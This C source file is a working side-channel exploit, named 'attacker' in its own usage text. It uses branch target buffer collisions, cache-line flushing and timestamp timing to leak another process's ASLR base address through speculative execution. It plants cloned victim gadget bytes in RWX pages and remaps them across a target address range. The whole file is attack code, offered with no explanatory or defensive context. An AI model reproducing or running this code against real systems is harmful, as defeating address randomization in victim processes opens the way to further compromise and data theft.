#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <sys/mman.h>
#include <sys/mman.h>
#include <signal.h>
#include <linux/mman.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <time.h>
#include <xmmintrin.h>

#define THRESHOLD 0xa0
#define BTB_COLLISION_TRIALS 200

void doNothing();

uint8_t *rdiPtr = (uint8_t *)doNothing;
uint8_t unused[4096];
uint8_t probeArray[4096];

/*modify gadget to mimic victim last branches and the call*/
#define GADGET_CLONE "\xff\xc8\x75\xfc\x0f\x31\x90\x90\x90\x90\x90\xff\x27"
#define GADGET_CLONE_SIZE 23
#define RD_R13_GADGET "E\x8am\x00"


void doNothing(){
    asm volatile (
            "mov esi,eax            \n"
            "mov ebx,edx            \n"
    		"rdtsc                  \n"
            "shl rbx, 32             \n"
            "add rbx,rsi            \n"
            "shl rdx,32             \n"
            "add rdx,rax             \n"
            "sub rdx, rbx           \n"
            "mov rax, rdx           \n"
            );
}

uint32_t callGadget(uint64_t code){

    volatile uint32_t time;
    asm __volatile__(
                "lea rdi, %2    \n"
                "lea r13, %3    \n"
                "mov eax,200    \n"
                "call %1       \n"
                :"=a" (time)
                : "m"(code),"m"(rdiPtr),"m"(probeArray[0])
                : "rdi"
            );
    return time;
}

void flush(char *adrs) 
{
    asm volatile (
		"clflush [%0]			\n"
        "cpuid\n"
      :
      : "c" (adrs)
      : "rax");
}

unsigned probe(char *adrs) 
{
	volatile unsigned long time;
    asm __volatile__(
        "    mfence             \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    lfence             \n"
        "    mov esi, eax       \n"
        "    mov eax,[%1]       \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    sub eax, esi       \n"
        "    clflush [%1]       \n"
		"    mfence             \n"
        "    lfence             \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx"
    );
    return time;
}


int disclosure(uint64_t rwx,float *time){
    usleep(1);
    
    flush(&rdiPtr);
    *time = callGadget(rwx);
        
    if(probe(&probeArray[0]) < THRESHOLD){
        return 1;
    }
    return 0;

    
}

uint64_t phase1(uint64_t srcPage,uint64_t srcEntry){
    //Leak BTB collision first
    float best=0;
    float secondBest=0;
    float curr=0;
    float time;
    float avg;
    uint8_t * bestrwx=NULL;
    uint8_t * secbestrwx=NULL;
    uint64_t p;

    
    for(uint64_t bhbMask=0x0; bhbMask<0x100UL;bhbMask++){
        p = 0x100000000000+(bhbMask<<12);
        srcPage = mremap(srcPage,0x1000UL,0x1000UL,MREMAP_MAYMOVE|MREMAP_FIXED,p);
        if(srcPage==(uint8_t *)-1){
            perror("mmap srcGadget failed");
            exit(1);
        }

        for(int i=0;i<BTB_COLLISION_TRIALS;i++){
            usleep(10);
            disclosure(srcPage+srcEntry,&time);
            if(i>5){
                curr+=time; 
            }
            
        }
        curr = curr/(BTB_COLLISION_TRIALS-5);
        avg+=curr;
        //printf("srcGadget=%p exec time  %f\n",srcGadget,curr);
        
        if(curr > best ){
            secondBest = best;
            best=curr;
            secbestrwx = bestrwx;
            bestrwx = srcPage;
        }
        else if(curr > secondBest){
            secondBest = curr;
            secbestrwx = srcPage;   
        }
    }
    printf("best match at %f (%p)\n",bestrwx,best);
    printf("Second best match at %f (%p) - avg: %f\n",secbestrwx,secondBest,avg/0x100);

    printf("Using %p as base for BTB collision...\n",bestrwx);
    //setup to best src location
    srcPage = mremap(srcPage, 0x1000UL,
                    0x1000UL, MREMAP_MAYMOVE | MREMAP_FIXED , bestrwx);
    if(srcPage==-1){
        printf("requested : %p\n",bestrwx);
        perror("mrmap srcGadget");
        exit(1);
    }

    return bestrwx;


}

uint8_t* phase2(uint8_t* srcPages, uint64_t srcEntry,uint64_t dstEntry
                ,uint64_t start,uint64_t end,uint64_t paralelPages){
    
    uint64_t currentAddr=NULL;
    uint64_t result=NULL;
    float time;
    volatile uint8_t d;

    /*seting up destination leak gadget*/
    uint8_t * dstPages = mmap(NULL, paralelPages*0x1000UL, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE| MAP_ANONYMOUS,-1, 0);
    if(dstPages==-1){
        perror("destination leak gadget");
        exit(1);
    }
    for(uint64_t i=0;i<paralelPages;i++){
        memcpy(&dstPages[dstEntry+i*0x1000UL], RD_R13_GADGET, sizeof(RD_R13_GADGET));
    }

    //discover destination pointer
    for(currentAddr=start;currentAddr<end;currentAddr = currentAddr+(0x1000UL*paralelPages) )
    {
        dstPages = mremap(dstPages, 0x1000UL*paralelPages,
                    0x1000UL*paralelPages, MREMAP_MAYMOVE | MREMAP_FIXED , currentAddr);
        //madvise(page, 0x100000UL, MADV_WILLNEED);
        
        if(dstPages==-1){
            perror("mmap remap");
            exit(1);
        }
        if(((uint64_t)dstPages&0xfffffff)==0){
            printf("\rTesting %p",dstPages);
        }
        //do gadget caching into data cache
        for(int i=0;i<paralelPages;i++){
            d = dstPages[dstEntry+i*0x1000UL];
        }
        
        
        if(disclosure(srcPages+srcEntry,&time)){
            if(disclosure(srcPages+srcEntry,&time)){  
                result=currentAddr;
                break;
            }

        }
    }
    munmap(currentAddr,0x1000*paralelPages);
    printf("\n");
    return result;
}


void leakAddress(uint64_t srcEntry,uint64_t dstEntry,uint64_t start,uint64_t end,uint64_t paralelPages){
  
    /*Seting up rwz caller page*/
    uint8_t * srcPage = mmap(NULL, 0x1000UL, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE| MAP_ANONYMOUS | MREMAP_FIXED,-1, 0);
    if(srcPage==-1){
        perror("mmap rwx");
        exit(1);
    }
    memcpy(&srcPage[srcEntry],GADGET_CLONE,GADGET_CLONE_SIZE);

    
   
    srcPage = phase1(srcPage,srcEntry);

    uint8_t * block = phase2(srcPage,srcEntry,dstEntry,start,end,paralelPages);
    if(block){
        printf("Speculative execution found in block %p Adjusting fine grain search\n",block);
        uint8_t *finalAddress = phase2(srcPage,srcEntry,dstEntry,block,block + 0x1000*paralelPages,1);
        printf("Final ASLR address found at %p\n",finalAddress);
    }
    else{
        printf("Oops, no speculative execution detected, try again \n");
    }

   
}

int main(int argc,char **argv){
    
    
    struct timeval begint, endt;

    if (argc < 6){
        printf("Usage: ./attacker gadgetBase, offset start end paralelPages\n");
        printf("Example: ./attacker 0x157 0x135 0x555000000000 0x56f000000000 0x1000\n");
        return 0;
    }

    uint64_t gadgetBase=(uint64_t)strtoul(argv[1],NULL,16)&0xfffff;
    uint64_t offset=(uint64_t)strtoul(argv[2],NULL,16)&0xfff;

    uint64_t start=(uint64_t)strtoul(argv[3],NULL,16)&(~0xfffUL);
    uint64_t end=(uint64_t)strtoul(argv[4],NULL,16)&(~0xfffUL);
    uint64_t paralelPages=(uint64_t)strtoul(argv[5],NULL,16);

    printf("Attacker: src: %p ->dst: %p \n",gadgetBase,offset);


    gettimeofday(&begint, 0);
    leakAddress(gadgetBase,offset,start,end,paralelPages);
    gettimeofday(&endt, 0);
    long seconds = endt.tv_sec - begint.tv_sec;
    long microseconds = endt.tv_usec - begint.tv_usec;
    double elapsed = seconds + microseconds*1e-6;
    
    
    printf("\nFinished at: %.3f seconds.\n", elapsed);


}
